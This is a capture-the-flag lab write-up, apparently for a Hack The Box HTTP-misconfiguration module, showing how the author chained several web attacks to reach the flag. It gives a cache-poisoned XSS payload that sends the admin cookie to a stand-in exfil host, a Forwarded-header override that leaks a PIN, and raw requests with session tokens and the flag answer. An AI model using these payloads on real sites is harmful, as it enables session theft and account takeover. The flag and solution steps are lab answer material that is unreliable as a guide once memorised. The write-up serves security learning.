This lab was a bit harder from the easy one from same module "Abusing HTTP Miss-configurations" because it involved several techniques and steps in order to get the flag.

# Solution guide
1)The first part involved the stealing of the admin cookie and ex-filtrating to interact.sh. After a manual fuzzing we found out that Bottle was vulnerable to parameter cloaking and knowing that Admins were monitoring(**admin/users.html?sort_by=role**) we need to inject that into web-cache so when the victim will request the link it will parse the XSS as-well! We found out that sort_by can be used to reflec our XSS payload so sending something like:
```
GET /admin/users.html?sort_by=role&utm_source=x;sort_by=role%22%29%3C%2Fscript%3E%3Cscript%3Enew%20Image%28%29.src%3D%22http%3A%2F%2Finteractsh.local%2Fcookie%3Fc%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E%3C%2Fscript%3E HTTP/1.1
Host: httpattacks.htb:37649
```
Will give us the cookie in interact.sh:
```
/cookie?c=sess=a3cfb7a470a9013f2fc4853e224187a6
Host: 127.0.0.1:8888
```

2)Using the cookie we can promote our-self via (http://httpattacks.htb:51832/admin/promote?uid=2), remember to logout and login again to parse the membership change!
3)Now we need to find the PINCODE in order to bypass the sysinfo portal(**/admin/sysinfo**) and here no XSS can be injected, no apparent auth bypass via session puzzling as reset/new user aren't implemented. it only remains Host-Header tampering via override headers.
We know that admin monitor this part via the URL (**/admin/sysinfo?refresh=1**) so the idea is to inject a Override header in the URL monitored by the admin and hope that when the URL get's visited it will redirect the response with the PINCODE towards the exfil server.
```
GET /admin/sysinfo?refresh=1 HTTP/1.1
Host: httpattacks.htb:46404
Upgrade-Insecure-Requests: 1
Cookie: sess=71fef7c525c05a054967ba971fedd386
Forwarded: interactsh.local

```
Will give us the Admin's PINCODE:
```
/admin/sysinfo_pin
Host: 127.0.0.1:8888
Cookie: sess=a3cfb7a470a9013f2fc4853e224187a6
pin=926402795027
```
4)Now we need to get the flag and here we have to trick the login function to first input the pin and then see the flag. The reason is that PIN input and FLAG are using the same session token!
First we need to perform a full pin request with admin cookie+pincode:
```
POST /admin/sysinfo_pin HTTP/1.1
Host: httpattacks.htb:32138
Cookie: sess=a3cfb7a470a9013f2fc4853e224187a6
Content-Length: 16

pin=926402795027
```
Next we can unveil the flag:
```
GET /admin/sysinfo HTTP/1.1
Host: httpattacks.htb:32138
Cookie: sess=a3cfb7a470a9013f2fc4853e224187a6
```
And this show the flag modal:
```
              </div>
            </div>
            <!-- Modal content -->
            <p>
                HTB{28b4584a8f1bb666d8e5a9250b535977}
            </p>
        </div>
    </div>
</div>
```